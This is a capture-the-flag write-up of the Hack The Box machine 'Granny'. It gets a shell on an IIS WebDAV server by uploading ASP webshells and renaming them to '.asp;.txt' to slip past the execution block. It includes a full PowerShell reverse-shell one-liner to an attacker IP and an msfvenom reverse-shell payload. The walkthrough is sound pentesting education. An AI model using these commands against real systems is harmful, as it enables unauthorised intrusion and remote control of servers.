I spent a bit of time finding the right shell payload - [[Writeups/Hack the Box/Boxes/Granny/10 - Website#Working ASP Shell|skip to the end of this section]] if you want to see the final one.

I copied across an `.asp` webshell:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ cp /usr/share/webshells/asp/cmdasp.asp .
```

I checked it didn't need any edits making, then attempted an upload:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ curl -T cmdasp.asp http://10.10.10.15/cmdasp.asp
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>The page cannot be found</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<STYLE type="text/css">
  BODY { font: 8pt/12pt verdana }
  H1 { font: 13pt/15pt verdana }
  H2 { font: 8pt/12pt verdana }
  A:link { color: red }
  A:visited { color: maroon }
</STYLE>
</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>

<h1>The page cannot be found</h1>
The page you are looking for might have been removed, had its name changed, or is temporarily unavailable.
<hr>
<p>Please try the following:</p>
<ul>
<li>Make sure that the Web site address displayed in the address bar of your browser is spelled and formatted correctly.</li>
<li>If you reached this page by clicking a link, contact
 the Web site administrator to alert them that the link is incorrectly formatted.
</li>
<li>Click the <a href="javascript:history.back(1)">Back</a> button to try another link.</li>
</ul>
<h2>HTTP Error 404 - File or directory not found.<br>Internet Information Services (IIS)</h2>
<hr>
<p>Technical Information (for support personnel)</p>
<ul>
<li>Go to <a href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft Product Support Services</a> and perform a title search for the words <b>HTTP</b> and <b>404</b>.</li>
<li>Open <b>IIS Help</b>, which is accessible in IIS Manager (inetmgr),
 and search for topics titled <b>Web Site Setup</b>, <b>Common Administrative Tasks</b>, and <b>About Custom Error Messages</b>.</li>
</ul>

</TD></TR></TABLE></BODY></HTML>
```

I wasn't sure why it was giving me this error, so did some digging into whether this was the right approach. I did a quick `searchsploit webdav` but couldn't find much new stuff (`windows/remote/18367.rb` looked promising, but was just doing something similar to what we already had). Therefore I continued with this approach and just tried fixing the syntax.

[Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web/put-method-webdav) has a fantastic article on WebDAV. Their first suggestion is to check it's vulnerable with `davtest`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ davtest -move -sendbd auto -url http://10.10.10.15
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.15
********************************************************
NOTE	Random string for this session: ISICmXPUq
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.10.10.15/DavTestDir_ISICmXPUq
********************************************************
 Sending test files (MOVE method)
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq_asp.txt
MOVE	asp	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.asp
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq_shtml.txt
MOVE	shtml	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.shtml
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq_php.txt
MOVE	php	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.php
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq_cfm.txt
MOVE	cfm	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.cfm
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq_aspx.txt
MOVE	aspx	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.aspx
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq_txt.txt
MOVE	txt	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.txt
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq_cgi.txt
MOVE	cgi	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.cgi
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq_html.txt
MOVE	html	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.html
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq_jhtml.txt
MOVE	jhtml	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.jhtml
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq_jsp.txt
MOVE	jsp	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.jsp
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq_pl.txt
MOVE	pl	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.pl
********************************************************
 Checking for test file execution
EXEC	asp	FAIL
EXEC	shtml	FAIL
EXEC	php	FAIL
EXEC	cfm	FAIL
EXEC	aspx	FAIL
EXEC	txt	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.txt
EXEC	cgi	FAIL
EXEC	html	SUCCEED:	http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.html
EXEC	jhtml	FAIL
EXEC	jsp	FAIL
EXEC	pl	FAIL
********************************************************
 Sending backdoors
** ERROR: Unable to find a backdoor for txt **
** ERROR: Unable to find a backdoor for html **

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_ISICmXPUq
MOVE/PUT File: http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.asp
MOVE/PUT File: http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.shtml
MOVE/PUT File: http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.php
MOVE/PUT File: http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.cfm
MOVE/PUT File: http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.aspx
MOVE/PUT File: http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.txt
MOVE/PUT File: http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.cgi
MOVE/PUT File: http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.html
MOVE/PUT File: http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.jhtml
MOVE/PUT File: http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.jsp
MOVE/PUT File: http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.pl
Executes: http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.txt
Executes: http://10.10.10.15/DavTestDir_ISICmXPUq/davtest_ISICmXPUq.html
```

So uploading files works - maybe I'm specifying the wrong upload location. Crucially though, executing `.asp` files does not. This is where the [second exploit on hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web/put-method-webdav#iis-5-6-webdav-vulnerability) comes in.

#### Leveraging WebDAV Upload

You can upload a `.asp` file with the extension `.txt` and then `MOVE` it to a file with the suffix `.asp;.txt`, and it will still be executed as a `.asp` but won't be blocked. Let's first try the upload with `curl`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ curl -T cmdasp.asp http://10.10.10.15/cmdasp.txt
```

It worked! We can visit the file in browser:

![[Pasted image 20210506130704.png]]

I'm not sure why my original command didn't work - it could perhaps be that it doesn't allow `.asp` uploads, but I'm not sure how `davtest` managed it. I initially thought that it may need single quote wrapping, but that wasn't the case either. Oh well.

Now I needed to move the file to a new location. I found [this useful list of webdav commands](https://www.qed42.com/blog/using-curl-commands-webdav):
- Reading files: `curl 'https://example.com/webdav'`
- Deleting files: `curl -X DELETE 'https://example.com/webdav/test.txt'`
- Renaming (`'MOVE'`): `curl -X MOVE --header 'Destination:http://example.org/new.txt' 'https://example.com/old.txt'`
- Creating folder (as done by `davtest`): `curl -X MKCOL 'https://example.com/new_folder'`

So we can use the following command:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ curl -X MOVE --header 'Destination:http://10.10.10.15/cmdasp.asp;.txt' 'http://10.10.10.15/cmdasp.txt'
```

(*note:* we could also have ran `cadaver 10.10.10.15` to get a `dav:/>` CLI and then used commands such as `put`)

Now when we visit the page we get a shell :D

![[Pasted image 20210506131102.png]]

However, it doesn't seem to change the output on the page:

![[Pasted image 20210506131724.png]]

I set up a quick `tcpdump` to see if I could ping myself:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ sudo tcpdump -i tun0 -n icmp
[sudo] password for mac: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

![[Pasted image 20210506134925.png]]

I didn't get anything back. I'm not sure if this was an issue with the `ping` executable, my listener, or my shell. So I tried to go straight for a reverse shell which I knew the syntax for, then fix my shell if it didn't work.

I found the following powershell reverse shell command:

```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

I set a listener going, and executed it:

![[Pasted image 20210506135232.png]]

Something strange has happened to the shell here. We also didn't get a hit on `netcat`.

I tried a new shell:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ cp /usr/share/webshells/asp/cmd-asp-5.1.asp .
```

But this one gave me a compilation error:

![[Pasted image 20210506135522.png]]

I tried uploading an aspx shell instead:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ cp /usr/share/webshells/aspx/cmdasp.aspx .
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ curl -T cmdasp.aspx http://10.10.10.15/cmdasp.txt
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ curl -X MOVE --header 'Destination:http://10.10.10.15/cmdasp.aspx;.txt' 'http://10.10.10.15/cmdasp.txt'
```

However, oddly it rendered as text:

![[Pasted image 20210506193551.png]]

I tried moving it to an `.asp;.txt` file:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ curl -T cmdasp.aspx http://10.10.10.15/cmdasp.txt
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ curl -X MOVE --header 'Destination:http://10.10.10.15/cmdasp.asp;.txt' 'http://10.10.10.15/cmdasp.txt'
```

But this gave a different error:

![[Pasted image 20210506193834.png]]

#### Working ASP Shell

FInally, I tried generating my own `asp` shellcode:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ msfvenom -p windows/shell_reverse_tcp -f asp -o msfasp.asp lhost=10.10.14.13 lport=9001
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of asp file: 38040 bytes
Saved as: msfasp.asp
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ curl -T msfasp.asp http://10.10.10.15/msfasp.txt
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ curl -X MOVE --header 'Destination:http://10.10.10.15/msfasp.asp;.txt' 'http://10.10.10.15/msfasp.txt'
```

This time we got a shell!

![[Pasted image 20210506194354.png]]

 This is an important lesson in using multiple tools. Persistence is key...